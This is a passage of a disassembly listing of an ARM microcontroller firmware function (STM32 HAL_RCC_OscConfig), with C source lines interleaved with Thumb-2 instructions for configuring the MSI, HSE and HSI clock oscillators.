08003910 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003910:	b580      	push	{r7, lr}
 8003912:	b088      	sub	sp, #32
 8003914:	af00      	add	r7, sp, #0
 8003916:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003918:	687b      	ldr	r3, [r7, #4]
 800391a:	2b00      	cmp	r3, #0
 800391c:	d102      	bne.n	8003924 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 800391e:	2301      	movs	r3, #1
 8003920:	f000 bc02 	b.w	8004128 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003924:	4b96      	ldr	r3, [pc, #600]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003926:	689b      	ldr	r3, [r3, #8]
 8003928:	f003 030c 	and.w	r3, r3, #12
 800392c:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 800392e:	4b94      	ldr	r3, [pc, #592]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003930:	68db      	ldr	r3, [r3, #12]
 8003932:	f003 0303 	and.w	r3, r3, #3
 8003936:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003938:	687b      	ldr	r3, [r7, #4]
 800393a:	681b      	ldr	r3, [r3, #0]
 800393c:	f003 0310 	and.w	r3, r3, #16
 8003940:	2b00      	cmp	r3, #0
 8003942:	f000 80e4 	beq.w	8003b0e <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003946:	69bb      	ldr	r3, [r7, #24]
 8003948:	2b00      	cmp	r3, #0
 800394a:	d007      	beq.n	800395c <HAL_RCC_OscConfig+0x4c>
 800394c:	69bb      	ldr	r3, [r7, #24]
 800394e:	2b0c      	cmp	r3, #12
 8003950:	f040 808b 	bne.w	8003a6a <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003954:	697b      	ldr	r3, [r7, #20]
 8003956:	2b01      	cmp	r3, #1
 8003958:	f040 8087 	bne.w	8003a6a <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 800395c:	4b88      	ldr	r3, [pc, #544]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 800395e:	681b      	ldr	r3, [r3, #0]
 8003960:	f003 0302 	and.w	r3, r3, #2
 8003964:	2b00      	cmp	r3, #0
 8003966:	d005      	beq.n	8003974 <HAL_RCC_OscConfig+0x64>
 8003968:	687b      	ldr	r3, [r7, #4]
 800396a:	699b      	ldr	r3, [r3, #24]
 800396c:	2b00      	cmp	r3, #0
 800396e:	d101      	bne.n	8003974 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003970:	2301      	movs	r3, #1
 8003972:	e3d9      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003974:	687b      	ldr	r3, [r7, #4]
 8003976:	6a1a      	ldr	r2, [r3, #32]
 8003978:	4b81      	ldr	r3, [pc, #516]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 800397a:	681b      	ldr	r3, [r3, #0]
 800397c:	f003 0308 	and.w	r3, r3, #8
 8003980:	2b00      	cmp	r3, #0
 8003982:	d004      	beq.n	800398e <HAL_RCC_OscConfig+0x7e>
 8003984:	4b7e      	ldr	r3, [pc, #504]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003986:	681b      	ldr	r3, [r3, #0]
 8003988:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800398c:	e005      	b.n	800399a <HAL_RCC_OscConfig+0x8a>
 800398e:	4b7c      	ldr	r3, [pc, #496]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003990:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003994:	091b      	lsrs	r3, r3, #4
 8003996:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800399a:	4293      	cmp	r3, r2
 800399c:	d223      	bcs.n	80039e6 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800399e:	687b      	ldr	r3, [r7, #4]
 80039a0:	6a1b      	ldr	r3, [r3, #32]
 80039a2:	4618      	mov	r0, r3
 80039a4:	f000 fd8c 	bl	80044c0 <RCC_SetFlashLatencyFromMSIRange>
 80039a8:	4603      	mov	r3, r0
 80039aa:	2b00      	cmp	r3, #0
 80039ac:	d001      	beq.n	80039b2 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 80039ae:	2301      	movs	r3, #1
 80039b0:	e3ba      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80039b2:	4b73      	ldr	r3, [pc, #460]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039b4:	681b      	ldr	r3, [r3, #0]
 80039b6:	4a72      	ldr	r2, [pc, #456]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039b8:	f043 0308 	orr.w	r3, r3, #8
 80039bc:	6013      	str	r3, [r2, #0]
 80039be:	4b70      	ldr	r3, [pc, #448]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039c0:	681b      	ldr	r3, [r3, #0]
 80039c2:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80039c6:	687b      	ldr	r3, [r7, #4]
 80039c8:	6a1b      	ldr	r3, [r3, #32]
 80039ca:	496d      	ldr	r1, [pc, #436]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039cc:	4313      	orrs	r3, r2
 80039ce:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80039d0:	4b6b      	ldr	r3, [pc, #428]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039d2:	685b      	ldr	r3, [r3, #4]
 80039d4:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80039d8:	687b      	ldr	r3, [r7, #4]
 80039da:	69db      	ldr	r3, [r3, #28]
 80039dc:	021b      	lsls	r3, r3, #8
 80039de:	4968      	ldr	r1, [pc, #416]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039e0:	4313      	orrs	r3, r2
 80039e2:	604b      	str	r3, [r1, #4]
 80039e4:	e025      	b.n	8003a32 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80039e6:	4b66      	ldr	r3, [pc, #408]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039e8:	681b      	ldr	r3, [r3, #0]
 80039ea:	4a65      	ldr	r2, [pc, #404]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039ec:	f043 0308 	orr.w	r3, r3, #8
 80039f0:	6013      	str	r3, [r2, #0]
 80039f2:	4b63      	ldr	r3, [pc, #396]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 80039f4:	681b      	ldr	r3, [r3, #0]
 80039f6:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80039fa:	687b      	ldr	r3, [r7, #4]
 80039fc:	6a1b      	ldr	r3, [r3, #32]
 80039fe:	4960      	ldr	r1, [pc, #384]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a00:	4313      	orrs	r3, r2
 8003a02:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a04:	4b5e      	ldr	r3, [pc, #376]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a06:	685b      	ldr	r3, [r3, #4]
 8003a08:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a0c:	687b      	ldr	r3, [r7, #4]
 8003a0e:	69db      	ldr	r3, [r3, #28]
 8003a10:	021b      	lsls	r3, r3, #8
 8003a12:	495b      	ldr	r1, [pc, #364]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a14:	4313      	orrs	r3, r2
 8003a16:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003a18:	69bb      	ldr	r3, [r7, #24]
 8003a1a:	2b00      	cmp	r3, #0
 8003a1c:	d109      	bne.n	8003a32 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003a1e:	687b      	ldr	r3, [r7, #4]
 8003a20:	6a1b      	ldr	r3, [r3, #32]
 8003a22:	4618      	mov	r0, r3
 8003a24:	f000 fd4c 	bl	80044c0 <RCC_SetFlashLatencyFromMSIRange>
 8003a28:	4603      	mov	r3, r0
 8003a2a:	2b00      	cmp	r3, #0
 8003a2c:	d001      	beq.n	8003a32 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003a2e:	2301      	movs	r3, #1
 8003a30:	e37a      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003a32:	f000 fc81 	bl	8004338 <HAL_RCC_GetSysClockFreq>
 8003a36:	4602      	mov	r2, r0
 8003a38:	4b51      	ldr	r3, [pc, #324]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a3a:	689b      	ldr	r3, [r3, #8]
 8003a3c:	091b      	lsrs	r3, r3, #4
 8003a3e:	f003 030f 	and.w	r3, r3, #15
 8003a42:	4950      	ldr	r1, [pc, #320]	; (8003b84 <HAL_RCC_OscConfig+0x274>)
 8003a44:	5ccb      	ldrb	r3, [r1, r3]
 8003a46:	f003 031f 	and.w	r3, r3, #31
 8003a4a:	fa22 f303 	lsr.w	r3, r2, r3
 8003a4e:	4a4e      	ldr	r2, [pc, #312]	; (8003b88 <HAL_RCC_OscConfig+0x278>)
 8003a50:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003a52:	4b4e      	ldr	r3, [pc, #312]	; (8003b8c <HAL_RCC_OscConfig+0x27c>)
 8003a54:	681b      	ldr	r3, [r3, #0]
 8003a56:	4618      	mov	r0, r3
 8003a58:	f7fd fb86 	bl	8001168 <HAL_InitTick>
 8003a5c:	4603      	mov	r3, r0
 8003a5e:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003a60:	7bfb      	ldrb	r3, [r7, #15]
 8003a62:	2b00      	cmp	r3, #0
 8003a64:	d052      	beq.n	8003b0c <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003a66:	7bfb      	ldrb	r3, [r7, #15]
 8003a68:	e35e      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003a6a:	687b      	ldr	r3, [r7, #4]
 8003a6c:	699b      	ldr	r3, [r3, #24]
 8003a6e:	2b00      	cmp	r3, #0
 8003a70:	d032      	beq.n	8003ad8 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003a72:	4b43      	ldr	r3, [pc, #268]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a74:	681b      	ldr	r3, [r3, #0]
 8003a76:	4a42      	ldr	r2, [pc, #264]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a78:	f043 0301 	orr.w	r3, r3, #1
 8003a7c:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a7e:	f7fd fbc3 	bl	8001208 <HAL_GetTick>
 8003a82:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a84:	e008      	b.n	8003a98 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a86:	f7fd fbbf 	bl	8001208 <HAL_GetTick>
 8003a8a:	4602      	mov	r2, r0
 8003a8c:	693b      	ldr	r3, [r7, #16]
 8003a8e:	1ad3      	subs	r3, r2, r3
 8003a90:	2b02      	cmp	r3, #2
 8003a92:	d901      	bls.n	8003a98 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a94:	2303      	movs	r3, #3
 8003a96:	e347      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a98:	4b39      	ldr	r3, [pc, #228]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003a9a:	681b      	ldr	r3, [r3, #0]
 8003a9c:	f003 0302 	and.w	r3, r3, #2
 8003aa0:	2b00      	cmp	r3, #0
 8003aa2:	d0f0      	beq.n	8003a86 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003aa4:	4b36      	ldr	r3, [pc, #216]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003aa6:	681b      	ldr	r3, [r3, #0]
 8003aa8:	4a35      	ldr	r2, [pc, #212]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003aaa:	f043 0308 	orr.w	r3, r3, #8
 8003aae:	6013      	str	r3, [r2, #0]
 8003ab0:	4b33      	ldr	r3, [pc, #204]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003ab2:	681b      	ldr	r3, [r3, #0]
 8003ab4:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003ab8:	687b      	ldr	r3, [r7, #4]
 8003aba:	6a1b      	ldr	r3, [r3, #32]
 8003abc:	4930      	ldr	r1, [pc, #192]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003abe:	4313      	orrs	r3, r2
 8003ac0:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003ac2:	4b2f      	ldr	r3, [pc, #188]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003ac4:	685b      	ldr	r3, [r3, #4]
 8003ac6:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003aca:	687b      	ldr	r3, [r7, #4]
 8003acc:	69db      	ldr	r3, [r3, #28]
 8003ace:	021b      	lsls	r3, r3, #8
 8003ad0:	492b      	ldr	r1, [pc, #172]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003ad2:	4313      	orrs	r3, r2
 8003ad4:	604b      	str	r3, [r1, #4]
 8003ad6:	e01a      	b.n	8003b0e <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003ad8:	4b29      	ldr	r3, [pc, #164]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003ada:	681b      	ldr	r3, [r3, #0]
 8003adc:	4a28      	ldr	r2, [pc, #160]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003ade:	f023 0301 	bic.w	r3, r3, #1
 8003ae2:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003ae4:	f7fd fb90 	bl	8001208 <HAL_GetTick>
 8003ae8:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003aea:	e008      	b.n	8003afe <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003aec:	f7fd fb8c 	bl	8001208 <HAL_GetTick>
 8003af0:	4602      	mov	r2, r0
 8003af2:	693b      	ldr	r3, [r7, #16]
 8003af4:	1ad3      	subs	r3, r2, r3
 8003af6:	2b02      	cmp	r3, #2
 8003af8:	d901      	bls.n	8003afe <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003afa:	2303      	movs	r3, #3
 8003afc:	e314      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003afe:	4b20      	ldr	r3, [pc, #128]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b00:	681b      	ldr	r3, [r3, #0]
 8003b02:	f003 0302 	and.w	r3, r3, #2
 8003b06:	2b00      	cmp	r3, #0
 8003b08:	d1f0      	bne.n	8003aec <HAL_RCC_OscConfig+0x1dc>
 8003b0a:	e000      	b.n	8003b0e <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003b0c:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003b0e:	687b      	ldr	r3, [r7, #4]
 8003b10:	681b      	ldr	r3, [r3, #0]
 8003b12:	f003 0301 	and.w	r3, r3, #1
 8003b16:	2b00      	cmp	r3, #0
 8003b18:	d073      	beq.n	8003c02 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003b1a:	69bb      	ldr	r3, [r7, #24]
 8003b1c:	2b08      	cmp	r3, #8
 8003b1e:	d005      	beq.n	8003b2c <HAL_RCC_OscConfig+0x21c>
 8003b20:	69bb      	ldr	r3, [r7, #24]
 8003b22:	2b0c      	cmp	r3, #12
 8003b24:	d10e      	bne.n	8003b44 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003b26:	697b      	ldr	r3, [r7, #20]
 8003b28:	2b03      	cmp	r3, #3
 8003b2a:	d10b      	bne.n	8003b44 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003b2c:	4b14      	ldr	r3, [pc, #80]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b2e:	681b      	ldr	r3, [r3, #0]
 8003b30:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b34:	2b00      	cmp	r3, #0
 8003b36:	d063      	beq.n	8003c00 <HAL_RCC_OscConfig+0x2f0>
 8003b38:	687b      	ldr	r3, [r7, #4]
 8003b3a:	685b      	ldr	r3, [r3, #4]
 8003b3c:	2b00      	cmp	r3, #0
 8003b3e:	d15f      	bne.n	8003c00 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003b40:	2301      	movs	r3, #1
 8003b42:	e2f1      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003b44:	687b      	ldr	r3, [r7, #4]
 8003b46:	685b      	ldr	r3, [r3, #4]
 8003b48:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003b4c:	d106      	bne.n	8003b5c <HAL_RCC_OscConfig+0x24c>
 8003b4e:	4b0c      	ldr	r3, [pc, #48]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b50:	681b      	ldr	r3, [r3, #0]
 8003b52:	4a0b      	ldr	r2, [pc, #44]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b54:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b58:	6013      	str	r3, [r2, #0]
 8003b5a:	e025      	b.n	8003ba8 <HAL_RCC_OscConfig+0x298>
 8003b5c:	687b      	ldr	r3, [r7, #4]
 8003b5e:	685b      	ldr	r3, [r3, #4]
 8003b60:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003b64:	d114      	bne.n	8003b90 <HAL_RCC_OscConfig+0x280>
 8003b66:	4b06      	ldr	r3, [pc, #24]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b68:	681b      	ldr	r3, [r3, #0]
 8003b6a:	4a05      	ldr	r2, [pc, #20]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b6c:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003b70:	6013      	str	r3, [r2, #0]
 8003b72:	4b03      	ldr	r3, [pc, #12]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b74:	681b      	ldr	r3, [r3, #0]
 8003b76:	4a02      	ldr	r2, [pc, #8]	; (8003b80 <HAL_RCC_OscConfig+0x270>)
 8003b78:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b7c:	6013      	str	r3, [r2, #0]
 8003b7e:	e013      	b.n	8003ba8 <HAL_RCC_OscConfig+0x298>
 8003b80:	40021000 	.word	0x40021000
 8003b84:	0800d27c 	.word	0x0800d27c
 8003b88:	20000000 	.word	0x20000000
 8003b8c:	20000004 	.word	0x20000004
 8003b90:	4ba0      	ldr	r3, [pc, #640]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003b92:	681b      	ldr	r3, [r3, #0]
 8003b94:	4a9f      	ldr	r2, [pc, #636]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003b96:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b9a:	6013      	str	r3, [r2, #0]
 8003b9c:	4b9d      	ldr	r3, [pc, #628]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003b9e:	681b      	ldr	r3, [r3, #0]
 8003ba0:	4a9c      	ldr	r2, [pc, #624]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003ba2:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003ba6:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003ba8:	687b      	ldr	r3, [r7, #4]
 8003baa:	685b      	ldr	r3, [r3, #4]
 8003bac:	2b00      	cmp	r3, #0
 8003bae:	d013      	beq.n	8003bd8 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bb0:	f7fd fb2a 	bl	8001208 <HAL_GetTick>
 8003bb4:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003bb6:	e008      	b.n	8003bca <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003bb8:	f7fd fb26 	bl	8001208 <HAL_GetTick>
 8003bbc:	4602      	mov	r2, r0
 8003bbe:	693b      	ldr	r3, [r7, #16]
 8003bc0:	1ad3      	subs	r3, r2, r3
 8003bc2:	2b64      	cmp	r3, #100	; 0x64
 8003bc4:	d901      	bls.n	8003bca <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003bc6:	2303      	movs	r3, #3
 8003bc8:	e2ae      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003bca:	4b92      	ldr	r3, [pc, #584]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003bcc:	681b      	ldr	r3, [r3, #0]
 8003bce:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003bd2:	2b00      	cmp	r3, #0
 8003bd4:	d0f0      	beq.n	8003bb8 <HAL_RCC_OscConfig+0x2a8>
 8003bd6:	e014      	b.n	8003c02 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bd8:	f7fd fb16 	bl	8001208 <HAL_GetTick>
 8003bdc:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003bde:	e008      	b.n	8003bf2 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003be0:	f7fd fb12 	bl	8001208 <HAL_GetTick>
 8003be4:	4602      	mov	r2, r0
 8003be6:	693b      	ldr	r3, [r7, #16]
 8003be8:	1ad3      	subs	r3, r2, r3
 8003bea:	2b64      	cmp	r3, #100	; 0x64
 8003bec:	d901      	bls.n	8003bf2 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003bee:	2303      	movs	r3, #3
 8003bf0:	e29a      	b.n	8004128 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003bf2:	4b88      	ldr	r3, [pc, #544]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003bf4:	681b      	ldr	r3, [r3, #0]
 8003bf6:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003bfa:	2b00      	cmp	r3, #0
 8003bfc:	d1f0      	bne.n	8003be0 <HAL_RCC_OscConfig+0x2d0>
 8003bfe:	e000      	b.n	8003c02 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003c00:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003c02:	687b      	ldr	r3, [r7, #4]
 8003c04:	681b      	ldr	r3, [r3, #0]
 8003c06:	f003 0302 	and.w	r3, r3, #2
 8003c0a:	2b00      	cmp	r3, #0
 8003c0c:	d060      	beq.n	8003cd0 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003c0e:	69bb      	ldr	r3, [r7, #24]
 8003c10:	2b04      	cmp	r3, #4
 8003c12:	d005      	beq.n	8003c20 <HAL_RCC_OscConfig+0x310>
 8003c14:	69bb      	ldr	r3, [r7, #24]
 8003c16:	2b0c      	cmp	r3, #12
 8003c18:	d119      	bne.n	8003c4e <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003c1a:	697b      	ldr	r3, [r7, #20]
 8003c1c:	2b02      	cmp	r3, #2
 8003c1e:	d116      	bne.n	8003c4e <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003c20:	4b7c      	ldr	r3, [pc, #496]	; (8003e14 <HAL_RCC_OscConfig+0x504>)
 8003c22:	681b      	ldr	r3, [r3, #0]
 8003c24:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c28:	2b00      	cmp	r3, #0
 8003c2a:	d005      	beq.n	8003c38 <HAL_RCC_OscConfig+0x328>
